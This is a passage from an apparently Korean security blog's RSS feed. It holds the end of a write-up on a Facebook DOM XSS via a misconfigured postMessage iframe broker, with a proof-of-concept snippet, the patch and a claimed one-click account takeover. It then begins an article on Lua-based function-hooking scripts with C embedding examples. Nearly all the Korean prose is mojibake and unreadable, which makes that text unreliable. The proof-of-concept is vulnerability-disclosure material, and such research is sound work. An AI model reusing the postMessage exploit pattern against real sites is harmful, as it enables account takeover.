class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ORIGIN&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;iframeEl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;contentWindow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;postMessage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;iframe&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;fbframe&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://www.facebook.com/v6.0/plugins/login_button.php?app_id=APP_ID&amp;amp;auto_logout_link=false&amp;amp;button_type=continue_with&amp;amp;channel=REDIRECT_URL&amp;amp;container_width=734&amp;amp;locale=en_US&amp;amp;sdk=joey&amp;amp;size=large&amp;amp;use_continue_as=true&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onload=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;fbFrameLoaded(this)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;iframe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;fix&quot;&gt;Fix&lt;/h2&gt;

&lt;p&gt;Facebookì€ &lt;code class=&quot;highlighter-rouge&quot;&gt;url&lt;/code&gt; íŒŒë¼ë¯¸í„°ì— ì •ê·œì‹ ê²€ì‚¬ë¥¼ ì¶”ê°€í•˜ì—¬ domainê³¼ schemaê°€ ì¡´ì¬í•˜ëŠ”ì§€ í™•ì¸í•˜ëŠ” ë°©ë²•ìœ¼ë¡œ íŒ¨ì¹˜í–ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;isFacebookURI&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;g&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;g&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;URI&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;XOAuthErrorController&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getURIBuilder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setEnum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;error_code&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;PLATFORM__INVALID_URL&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getURI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;proof-of-concept&quot;&gt;Proof of Concept&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://youtu.be/KAnuFy2F7QA&quot;&gt;https://youtu.be/KAnuFy2F7QA&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;impact&quot;&gt;Impact&lt;/h2&gt;

&lt;p&gt;ì˜ëª»ëœ post message ì„¤ì • ë•Œë¬¸ì— ëˆ„êµ°ê°€ëŠ” ê³µê²©ìì˜ ì›¹ì„¸ì´íŠ¸ì— ì ‘ì†í•˜ê³  í˜ì´ìŠ¤ë¶ìœ¼ë¡œ ë¡œê·¸ì¸í•˜ê¸° ë²„íŠ¼ì„ í´&lt;/p&gt;

&lt;p&gt;ë¦­í•¨ìœ¼ë¡œì¨ &lt;a href=&quot;http://facebook.com&quot;&gt;facebook.com&lt;/a&gt; ë„ë©”ì¸ì— XSSê°€ ë°œìƒí•˜ê³  &lt;strong&gt;í•œ ë²ˆì˜ í´ë¦­ ë§Œìœ¼ë¡œ ê³„ì •ì„ íƒˆì·¨&lt;/strong&gt; í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;
</description>
        <pubDate>Fri, 01 May 2020 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/2020-05-01/iframe-broker-Story-of-Facebook-DOM-XSS</link>
        <guid isPermaLink="true">http://localhost:4000/2020-05-01/iframe-broker-Story-of-Facebook-DOM-XSS</guid>
        
        <category>web</category>
        
        
      </item>
    
      <item>
        <title>Lua ê¸°ë°˜ì˜ í›„í‚¹ ìŠ¤í¬ë¦½íŠ¸ ê¸°ëŠ¥ êµ¬í˜„ì— ëŒ€í•œ ì—°êµ¬</title>
        <description>&lt;p&gt;ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ê¹€ì¬ì„±&lt;/p&gt;

&lt;h1 id=&quot;1-ê°œìš”&quot;&gt;1. ê°œìš”&lt;/h1&gt;

&lt;hr /&gt;

&lt;p&gt;LuaëŠ” C/C++ì— ì´ì‹ë˜ëŠ” ê²ƒì„ ì—¼ë‘í•˜ê³  ê°œë°œëœ ì‘ê³  ê°€ë²¼ìš´ ìŠ¤í¬ë¦½íŠ¸ ì–¸ì–´ì…ë‹ˆë‹¤. ì´ë¯¸ ì‘ì„±ëœ í”„ë¡œê·¸ë¨ì˜ ì»´íŒŒì¼ ì—†ì´ ì½”ë“œë¥¼ ì‹¤ì‹œê°„ìœ¼ë¡œ ë³€ê²½í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì— íŠ¹íˆ ê²Œì„ì—ì„œ ë§ì´ í™œìš©ë˜ê³  ìˆëŠ”ë° ë³¸ë¬¸ì—ì„œëŠ” ì‚¬ìš©ìê°€ í•¨ìˆ˜ í›„í‚¹ì„ ì‰½ê²Œ í•  ìˆ˜ ìˆë„ë¡ í›„í‚¹ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì œê³µí•˜ëŠ” ëª©ì ìœ¼ë¡œ í™œìš©, ì—°êµ¬í•´ë³´ì•˜ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;h1 id=&quot;2-lua-ì„¤ì¹˜-ë°-ì˜ˆì œ&quot;&gt;2. Lua ì„¤ì¹˜ ë° ì˜ˆì œ&lt;/h1&gt;

&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt; lua5.3 liblua5.3-dev
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ìš´ì˜ì²´ì œ Ubuntu 18.04 ê¸°ì¤€ìœ¼ë¡œ ìœ„ì™€ ê°™ì€ ëª…ë ¹ì–´ë¡œ Luaì„ ì‰½ê²Œ ì„¤ì¹˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì •ìƒì ìœ¼ë¡œ ì„¤ì¹˜ë˜ì—ˆë‹¤ë©´ pythonì²˜ëŸ¼ ì¸í„°í”„ë¦¬í„°ë¥¼ ì‚¬ìš©í•˜ì—¬ &lt;code class=&quot;highlighter-rouge&quot;&gt;Hello world&lt;/code&gt;ë¥¼ ì¶œë ¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2ec542e0-bc45-4750-a6bb-ee28a0d8810c/10788588-caf9-4202-b016-6760b1a1e1cb.png&quot; alt=&quot;/assets/2ec542e0-bc45-4750-a6bb-ee28a0d8810c/10788588-caf9-4202-b016-6760b1a1e1cb.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;lua-example.c&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//gcc -o lua-example lua-example.c -llua5.3&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#include &quot;lua5.3/lua.h&quot;
#include &quot;lua5.3/lualib.h&quot;
#include &quot;lua5.3/lauxlib.h&quot;
#include &amp;lt;stdio.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;c_xor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lua_State&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv_1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lua_tointeger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv_2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lua_tointeger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv_1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv_2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;lua_pushinteger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;double&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;lua_State&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;L&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;luaL_newstate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;luaL_openlibs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;lua_pushcfunction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c_xor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;lua_setglobal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;c_xor&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;luaL_dofile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;script.lua&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;lua_close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;script.lua&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-lua highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;string.format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;123&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;456&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;%d ^ %d = %d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c_xor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ìœ„ì˜ ì†ŒìŠ¤ì½”ë“œëŠ” Lua ìŠ¤í¬ë¦½íŠ¸ì—ì„œ Cì˜ &lt;code class=&quot;highlighter-rouge&quot;&gt;c_xor&lt;/code&gt; í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ê³  ê²°ê³¼ë¥¼ ì¶œë ¥í•˜ëŠ” ì˜ˆì œì…ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;Cì—ì„œ lua_pushcfunction í•¨ìˆ˜ë¥¼ ì´ìš©í•´ c_xor í•¨ìˆ˜ë¥¼ ë“±ë¡í•˜ë©´ Luaì—ì„œ í•´ë‹¹ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•  ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤. ë°˜ëŒ€ë¡œ Luaì—ì„œ ì„ ì–¸ëœ í•¨ìˆ˜ë¥¼ Cì—ì„œ í˜¸ì¶œí•˜ëŠ” ê²ƒë„ ê°€ëŠ¥í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;c_xor í•¨ìˆ˜ì—ì„œëŠ” lua_tointeger í•¨ìˆ˜ë¥¼ ì´ìš©í•´ Luaë¡œë¶€í„° ì „ë‹¬ë°›ì€ ì¸ìë¥¼ Cì˜ longí˜•ìœ¼ë¡œ ë³€í™˜í•˜ì—¬ ê°€ì ¸ì™”ëŠ”ë° ì•„ë˜ì²˜ëŸ¼ ë‹¤ë¥¸ í˜•ì‹ìœ¼ë¡œë„ ì¸ìë¥¼ ê°€ì ¸ì˜¬ ìˆ˜ ìˆë„ë¡ ì—¬ëŸ¬ í•¨ìˆ˜ë¥¼ ì§€ì›í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.notion.so/c205aad4e6bc492daa626c6817b12473&quot;&gt;Lua í˜•ì‹ ë³€í™˜ í•¨ìˆ˜&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ì´ì™¸ì— lua_toboolean ê°™ì€ í•¨ìˆ˜ë“¤ë„ ìˆëŠ”ë° &lt;a href=&quot;https://www.lua.org/manual/5.3/manual.html&quot;&gt;https://www.lua.org/manual/5.3/manual.html&lt;/a&gt;ì—ì„œ ìì„¸í•œ ë ˆí¼ëŸ°ìŠ¤ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;í•¨ìˆ˜ ë°˜í™˜ ê°’ì˜ ê²½ìš° LuaëŠ” ë°˜í™˜ ê°’ì„ í•œë²ˆì— ì—¬ëŸ¬ ê°œ ì „ë‹¬í•  ìˆ˜ ìˆëŠ”ë° ì—¬ê¸°ì„œëŠ” 1ê°œë§Œ ì „ë‹¬í•  ê²ƒì´ë¯€ë¡œ result ë³€ìˆ˜ ê°’ì„ í‘¸ì‹œ(&lt;code class=&quot;highlighter-rouge&quot;&gt;lua_pushinteger(L, result)&lt;/code&gt;)í•˜ê³  &lt;code class=&quot;highlighter-rouge&quot;&gt;return 1&lt;/code&gt;ì„ í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/a06b3ab7-951c-4437-ac29-bba22f3bf0f4/dfebf1b1-02d8-427b-81b1-19edaeb1441e.png&quot; alt=&quot;/assets/a06b3ab7-951c-4437-ac29-bba22f3bf0f4/dfebf1b1-02d8-427b-81b1-19edaeb1441e.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ì»´íŒŒì¼ì€ &lt;strong&gt;gcc -o lua-example lua-example.c -llua5.3&lt;/strong&gt; ëª…ë ¹ì–´ë¡œ ê°€ëŠ¥í•˜ê³ , ì˜ˆì œ ì‹¤í–‰ ê²°ê³¼ëŠ” 123ê³¼ 456ì„ xorí•œ 435ê°€ ì¶œë ¥ë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;h1 id=&quot;3-í›„í‚¹-ìŠ¤í¬ë¦½íŠ¸-ê¸°ëŠ¥-êµ¬í˜„&quot;&gt;3. í›„í‚¹ ìŠ¤í¬ë¦½íŠ¸ ê¸°ëŠ¥ êµ¬í˜„&lt;/h1&gt;

&lt;hr /&gt;

&lt;p&gt;í›„í‚¹ ìš©ë„ëŠ” ì‚¬ìš©ìë§ˆë‹¤ ë‹¤ì–‘í•˜ê¸° ë•Œë¬¸ì— ì•„ë˜ì™€ ê°™ì€ í˜•ì‹ìœ¼ë¡œ í›„í‚¹ì´ ê°€ëŠ¥í•˜ë©´ ì¢‹ì„ ê²ƒ ê°™ë‹¤ê³  íŒë‹¨í•˜ì˜€ìŠµë‹ˆë‹¤. í•´ë‹¹ ì¸í„°í˜ì´ìŠ¤ë¡œ êµ¬í˜„í•˜ë©´ ì‚¬ìš©ìëŠ” ìƒˆë¡­ê²Œ ì •ì˜í•œ í•¨ìˆ˜ì—ì„œ ì›ë³¸ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì§€ ì•Šì„ ìˆ˜ë„ ìˆê³  í•¨ìˆ˜ì˜ ì¸ìê°’ì„ ì¡°ì‘í•˜ê±°ë‚˜ ë°˜í™˜ ê°’ì„ ë³€ê²½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-lua highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;new_open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pathname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;original_open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pathname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;hook&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;open&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;new_open&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;original_open&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ìœ„ì™€ ê°™ì€ í˜•íƒœë¡œ êµ¬í˜„í•˜ê¸° ìœ„í•´ì„œëŠ” ë‹¤ìŒê³¼ ê°™ì€ ê³¼ì •ì´ í•„ìš”í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;hook í•¨ìˆ˜ë¥¼ í˜¸ì¶œí–ˆì„ ë•Œ open í•¨ìˆ˜ í›„í‚¹&lt;/li&gt;
  &lt;li&gt;í›„í‚¹ëœ open í•¨ìˆ˜ê°€ í˜¸ì¶œë˜ì—ˆì„ë•Œ Luaì—ì„œ ì •ì˜í•œ new_open í•¨ìˆ˜ í˜¸ì¶œ&lt;/li&gt;
